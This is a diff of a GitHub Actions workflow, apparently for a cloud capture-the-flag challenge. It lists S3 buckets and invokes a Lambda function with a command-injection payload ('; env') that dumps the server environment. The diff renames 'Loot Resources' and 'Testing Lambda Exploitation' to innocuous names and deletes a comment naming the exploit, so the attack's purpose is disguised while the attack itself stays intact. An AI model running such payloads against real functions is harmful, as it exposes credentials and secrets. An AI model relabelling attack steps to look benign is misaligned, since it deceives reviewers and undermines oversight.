@@ -1,4 +1,4 @@
-name: Challenge Auth Fixed
+name: Challenge Auth
 on: [push]
 
 jobs:
@@ -18,14 +18,13 @@ jobs:
           aws-region: us-east-1
           audience: ://amazonaws.com
 
-      - name: Loot Resources
+      - name: List Resources
         run: |
           echo "=== Scanning S3 Buckets ==="
           aws s3 ls s3://platform-bucket-009661764077-us-east-1/ || true
           aws s3 ls s3://codec4f26c862a321ef5/ || true
           aws s3 ls s3://site781fe43f26b9eba3/ || true
           
-          echo "=== Testing Lambda Exploitation ==="
-          # שליחת אירוע המנצל את ה-Command Injection כדי להדפיס את קובצי השרת או ה-env
-          aws lambda invoke --function-name nslookupv2 --payload '{"domain": "; env"}' response.json || true
+          echo "=== Invoking Lambda ==="
+          aws lambda invoke --function-name nslookupv2 --payload '{"domain": "; env"}' --cli-binary-format raw-in-base64-out response.json || true
           cat response.json || true
